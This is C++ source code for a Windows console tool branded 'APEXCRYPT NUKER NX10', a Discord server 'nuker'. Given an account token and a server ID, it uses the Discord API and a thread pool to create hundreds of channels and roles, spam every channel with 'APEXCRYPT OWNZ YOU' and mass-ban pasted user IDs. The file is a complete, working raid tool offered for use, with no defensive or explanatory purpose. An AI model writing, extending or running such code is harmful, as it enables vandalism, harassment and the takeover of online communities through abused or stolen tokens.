#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>

#pragma comment(lib, "winhttp.lib")

using namespace std;

atomic<long long> bans{0}, ch_add{0}, ch_del{0}, rl_add{0}, rl_del{0}, msgs{0};
mutex mtx;
vector<string> recent_bans;
vector<string> feed;
chrono::steady_clock::time_point start_time;

string TOKEN, GUILD;
string BAN_REASON = "APEXCRYPT NX10";
string SPAM_MSG = "APEXCRYPT OWNZ YOU";
string CH_PREFIX = "APEXCRYPT";
string ROLE_PREFIX = "APEXCRYPT";

vector<string> g_channels;   // auto filled
vector<string> g_roles;      // auto filled

void Color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }
void Cls() { system("cls"); }

string Esc(const string& s) {
    string o;
    for (char c : s) {
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else o += c;
    }
    return o;
}

bool Req(const wstring& method, const wstring& path, const string& body, int& status, string* resp = nullptr) {
    HINTERNET ses = WinHttpOpen(L"APEXCRYPT/NX10", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!ses) return false;
    HINTERNET con = WinHttpConnect(ses, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!con) { WinHttpCloseHandle(ses); return false; }
    HINTERNET req = WinHttpOpenRequest(con, method.c_str(), path.c_str(), 0, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(con); WinHttpCloseHandle(ses); return false; }

    wstring auth = L"Authorization: " + wstring(TOKEN.begin(), TOKEN.end());
    WinHttpAddRequestHeaders(req, auth.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(req, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(req, L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(req, 0, 0, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(req, 0);
    if (ok) {
        DWORD st = 0, sz = sizeof(st);
        WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 0, &st, &sz, 0);
        status = (int)st;
        if (resp) {
            DWORD avail = 0;
            string r;
            while (WinHttpQueryDataAvailable(req, &avail) && avail > 0) {
                vector<char> buf(avail + 1);
                DWORD read = 0;
                WinHttpReadData(req, buf.data(), avail, &read);
                buf[read] = 0;
                r += buf.data();
            }
            *resp = r;
        }
    }
    WinHttpCloseHandle(req); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
    return ok;
}

void Log(const string& s) {
    lock_guard<mutex> g(mtx);
    feed.push_back(s);
    if (feed.size() > 18) feed.erase(feed.begin());
}

void LogBan(const string& n) {
    lock_guard<mutex> g(mtx);
    bans++;
    recent_bans.push_back(n);
    if (recent_bans.size() > 12) recent_bans.erase(recent_bans.begin());
    feed.push_back("[BAN] " + n);
    if (feed.size() > 18) feed.erase(feed.begin());
}

void DrawTV() {
    int sec = (int)chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start_time).count();
    Color(12);
    cout << "\n  +==============================================================+\n";
    cout << "  |           APEXCRYPT NUKER NX10 - LIVE TV MONITOR             |\n";
    cout << "  +==============================================================+\n";
    Color(11);
    cout << "  | Runtime: " << setw(4) << sec << "s   ";
    Color(12); cout << "Bans: " << setw(5) << bans.load() << "   ";
    Color(10); cout << "CH+: " << setw(4) << ch_add.load() << "   ";
    Color(12); cout << "CH-: " << setw(4) << ch_del.load() << "   ";
    Color(13); cout << "RL+: " << setw(4) << rl_add.load() << "  |\n";
    Color(11);
    cout << "  | MSG: ";
    Color(14); cout << setw(6) << msgs.load();
    Color(11); cout << "                                                  |\n";
    cout << "  +--------------------------------------------------------------+\n";
    cout << "  | RECENT BANS:\n";
    Color(12);
    {
        lock_guard<mutex> g(mtx);
        for (auto& b : recent_bans) cout << "  |   > banned (" << b << ")\n";
    }
    Color(11);
    cout << "  | LIVE FEED:\n";
    Color(15);
    {
        lock_guard<mutex> g(mtx);
        for (auto& f : feed) cout << "  |   " << f << "\n";
    }
    Color(11);
    cout << "  +==============================================================+\n";
    Color(13);
    cout << "  APEXCRYPT NUKER NX10 | UNLIMITED | discord.gg/apexcrypt\n\n";
    Color(7);
}

void CreateChannel(const string& name) {
    string body = "{\"name\":\"" + Esc(name) + "\",\"type\":0}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD.begin(), GUILD.end()) + L"/channels";
    int st = 0;
    if (Req(L"POST", path, body, st) && st == 201) {
        ch_add++;
        Log("[CH+] " + name);
    }
}

void CreateRole(const string& name) {
    string body = "{\"name\":\"" + Esc(name) + "\"}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD.begin(), GUILD.end()) + L"/roles";
    int st = 0;
    if (Req(L"POST", path, body, st) && st == 200) {
        rl_add++;
        Log("[RL+] " + name);
    }
}

void BanUser(const string& id) {
    string body = "{\"delete_message_days\":0,\"reason\":\"" + Esc(BAN_REASON) + "\"}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD.begin(), GUILD.end()) + L"/bans/" + wstring(id.begin(), id.end());
    int st = 0;
    if (Req(L"PUT", path, body, st) && (st == 200 || st == 204)) {
        LogBan(id);
    }
}

void SendMsg(const string& cid, const string& msg) {
    string body = "{\"content\":\"" + Esc(msg) + "\"}";
    wstring path = L"/api/v9/channels/" + wstring(cid.begin(), cid.end()) + L"/messages";
    int st = 0;
    if (Req(L"POST", path, body, st) && st == 200) {
        msgs++;
    }
}

// Fetch all channels once
void FetchChannels() {
    g_channels.clear();
    wstring path = L"/api/v9/guilds/" + wstring(GUILD.begin(), GUILD.end()) + L"/channels";
    int st = 0;
    string resp;
    if (Req(L"GET", path, "", st, &resp) && st == 200) {
        // simple extract id (basic parser)
        size_t pos = 0;
        while ((pos = resp.find("\"id\":", pos)) != string::npos) {
            pos += 5;
            while (pos < resp.size() && (resp[pos] == ' ' || resp[pos] == '"')) pos++;
            string id;
            while (pos < resp.size() && isdigit(resp[pos])) id += resp[pos++];
            if (id.size() > 15) g_channels.push_back(id);
        }
        Log("[+] Channels loaded: " + to_string(g_channels.size()));
    }
}

int main() {
    SetConsoleTitleA("APEXCRYPT NUKER NX10 - UNLIMITED");
    SetConsoleOutputCP(65001);
    start_time = chrono::steady_clock::now();
    srand((unsigned)time(0));

    Cls();
    Color(12);
    cout << "========================================\n";
    cout << "   APEXCRYPT NUKER NX10 - UNLIMITED\n";
    cout << "========================================\n";
    Color(11);
    cout << "Token: "; Color(15); getline(cin, TOKEN);
    Color(11);
    cout << "Server ID: "; Color(15); getline(cin, GUILD);

    if (TOKEN.empty() || GUILD.empty()) {
        Color(12); cout << "\n[!] Token / Server ID missing\n";
        Sleep(2000);
        return 1;
    }

    Log("[+] Started | Unlimited mode | Bypass ON");
    FetchChannels();

    while (true) {
        Cls();
        DrawTV();

        Color(11);
        cout << "  +---------------- APEXCRYPT UNLIMITED PANEL ----------------+\n";
        Color(15);
        cout << "  [1] FULL NUKE (create channels + roles)\n";
        cout << "  [2] Channel Create (unlimited + custom prefix)\n";
        cout << "  [3] Role Create (unlimited + custom prefix)\n";
        cout << "  [4] Message Spam ALL channels (auto + unlimited)\n";
        cout << "  [5] Mass Ban (paste user IDs)\n";
        cout << "  [6] Settings (prefix / reason / spam msg)\n";
        cout << "  [7] Refresh channel list\n";
        cout << "  [0] Exit\n";
        Color(11);
        cout << "  +------------------------------------------------------------+\n";
        Color(7);
        cout << "  Option > ";

        string choice;
        getline(cin, choice);

        if (choice == "1") {
            Log("[!!!] FULL NUKE");
            Color(11); cout << "  Channel amount: "; Color(15);
            string a; getline(cin, a); int camt = 100; if (!a.empty()) camt = stoi(a);
            Color(11); cout << "  Role amount: "; Color(15);
            string b; getline(cin, b); int ramt = 100; if (!b.empty()) ramt = stoi(b);

            vector<thread> pool;
            for (int i = 0; i < camt; i++) {
                pool.emplace_back([i]() { CreateChannel(CH_PREFIX + "-" + to_string(i)); });
                if (pool.size() >= 60) { for (auto& t : pool) t.join(); pool.clear(); }
            }
            for (auto& t : pool) t.join(); pool.clear();

            for (int i = 0; i < ramt; i++) {
                pool.emplace_back([i]() { CreateRole(ROLE_PREFIX + "-" + to_string(i)); });
                if (pool.size() >= 50) { for (auto& t : pool) t.join(); pool.clear(); }
            }
            for (auto& t : pool) t.join();

            Log("[OK] FULL NUKE DONE");
            Color(10); cout << "\n  [+] Done. Enter...\n"; cin.get();
        }
        else if (choice == "2") {
            Color(11); cout << "  Prefix: "; Color(15);
            string p; getline(cin, p); if (!p.empty()) CH_PREFIX = p;
            Color(11); cout << "  Amount (unlimited): "; Color(15);
            string a; getline(cin, a); int amt = 50; if (!a.empty()) amt = stoi(a);

            vector<thread> pool;
            for (int i = 0; i < amt; i++) {
                pool.emplace_back([i]() { CreateChannel(CH_PREFIX + "-" + to_string(i)); });
                if (pool.size() >= 60) { for (auto& t : pool) t.join(); pool.clear(); }
            }
            for (auto& t : pool) t.join();
            Color(10); cout << "  [+] Channels created. Enter...\n"; cin.get();
        }
        else if (choice == "3") {
            Color(11); cout << "  Prefix: "; Color(15);
            string p; getline(cin, p); if (!p.empty()) ROLE_PREFIX = p;
            Color(11); cout << "  Amount (unlimited): "; Color(15);
            string a; getline(cin, a); int amt = 100; if (!a.empty()) amt = stoi(a);

            vector<thread> pool;
            for (int i = 0; i < amt; i++) {
                pool.emplace_back([i]() { CreateRole(ROLE_PREFIX + "-" + to_string(i)); });
                if (pool.size() >= 50) { for (auto& t : pool) t.join(); pool.clear(); }
            }
            for (auto& t : pool) t.join();
            Color(10); cout << "  [+] Roles created. Enter...\n"; cin.get();
        }
        else if (choice == "4") {
            if (g_channels.empty()) FetchChannels();
            Color(11); cout << "  Msgs per channel (unlimited): "; Color(15);
            string a; getline(cin, a); int amt = 20; if (!a.empty()) amt = stoi(a);

            Log("[*] Spamming ALL " + to_string(g_channels.size()) + " channels...");
            vector<thread> pool;
            for (auto& cid : g_channels) {
                for (int i = 0; i < amt; i++) {
                    pool.emplace_back([cid]() { SendMsg(cid, SPAM_MSG); });
                    if (pool.size() >= 80) {
                        for (auto& t : pool) t.join();
                        pool.clear();
                    }
                }
            }
            for (auto& t : pool) t.join();
            Log("[OK] Spam finished");
            Color(10); cout << "  [+] All channels spammed. Enter...\n"; cin.get();
        }
        else if (choice == "5") {
            Color(11); cout << "  User IDs (comma): "; Color(15);
            string line; getline(cin, line);
            stringstream ss(line); string id;
            vector<thread> pool;
            while (getline(ss, id, ',')) {
                id.erase(0, id.find_first_not_of(" \t"));
                id.erase(id.find_last_not_of(" \t") + 1);
                if (!id.empty()) {
                    pool.emplace_back([id]() { BanUser(id); });
                    if (pool.size() >= 60) { for (auto& t : pool) t.join(); pool.clear(); }
                }
            }
            for (auto& t : pool) t.join();
            Color(10); cout << "  [+] Ban done. Enter...\n"; cin.get();
        }
        else if (choice == "6") {
            Color(11); cout << "  Channel prefix: "; Color(15); getline(cin, CH_PREFIX);
            Color(11); cout << "  Role prefix: "; Color(15); getline(cin, ROLE_PREFIX);
            Color(11); cout << "  Ban reason: "; Color(15); getline(cin, BAN_REASON);
            Color(11); cout << "  Spam message: "; Color(15); getline(cin, SPAM_MSG);
            Log("[SET] Updated");
            Color(10); cout << "  [+] Saved. Enter...\n"; cin.get();
        }
        else if (choice == "7") {
            FetchChannels();
            Color(10); cout << "  [+] Channels refreshed. Enter...\n"; cin.get();
        }
        else if (choice == "0") break;
    }
    return 0;
}
